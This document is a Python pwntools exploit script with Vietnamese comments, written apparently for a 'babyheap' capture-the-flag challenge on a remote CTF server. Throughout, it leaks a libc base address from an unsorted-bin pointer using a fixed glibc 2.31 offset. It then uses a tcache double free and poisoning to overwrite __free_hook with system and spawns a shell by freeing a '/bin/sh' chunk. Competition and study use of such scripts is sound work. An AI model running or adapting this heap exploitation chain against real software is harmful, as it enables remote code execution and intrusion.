from pwn import *

# Cấu hình môi trường
context.binary = elf = ELF('./babyheap')
libc = ELF('./libc.so.6')
# p = process('./babyheap')
# gdb.attach(p)
p = remote('baby-heap.nc.jctf.pro', 1337)

# --- Các hàm tiện ích ---
def create(index, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index? ', str(index).encode())
    p.sendlineafter(b'Content? ', content)

def update(index, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index? ', str(index).encode())
    p.sendlineafter(b'Content? ', content)

def delete(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index? ', str(index).encode())

def read_chunk(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index? ', str(index).encode())
    return p.recvuntil(b'Menu:', drop=True)

# --- BƯỚC 1: LEAK LIBC ADDRESS ---
log.info("Phase 1: Leaking libc address")
for i in range(8):
    create(i, b'A' * 8)

for i in range(7):
    delete(i)

delete(7)

leaked_data = read_chunk(7)
leaked_addr = u64(leaked_data[:8])
log.success(f"Leaked unsorted bin pointer: {hex(leaked_addr)}")

# === DÒNG SỬA LỖI Ở ĐÂY ===
# Thay vì dùng symbol 'main_arena', ta dùng một offset cố định.
# Offset này là khoảng cách từ con trỏ trong unsorted bin đến địa chỉ base của libc.
# Giá trị 0x1ebbe0 là phổ biến cho glibc 2.31 x86-64. 
# Bạn có thể cần thay đổi nó nếu challenge dùng libc khác.
UNSORTED_BIN_OFFSET = 0x1ebbe0 
libc.address = leaked_addr - UNSORTED_BIN_OFFSET
log.success(f"Calculated libc base address: {hex(libc.address)}")

# Lấy địa chỉ các hàm cần thiết từ địa chỉ base vừa tính được
free_hook_addr = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
log.info(f"__free_hook @ {hex(free_hook_addr)}")
log.info(f"system @ {hex(system_addr)}")

# --- BƯỚC 2 & 3: TCACHE DOUBLE FREE & POISONING ---
log.info("Phase 2 & 3: Tcache double free and poisoning")
create(0, b'target A')
create(1, b'target B')

delete(0)
delete(1)
delete(0)

update(0, p64(free_hook_addr))

create(2, b'first alloc')
create(3, b'malicious')
log.success("Tcache poisoned! chunk[3] now points to __free_hook")

# --- BƯỚC 4: GETTING THE SHELL ---
log.info("Phase 4: Overwriting __free_hook and triggering it")
update(3, p64(system_addr))
create(4, b'/bin/sh\x00')
delete(4)

p.interactive()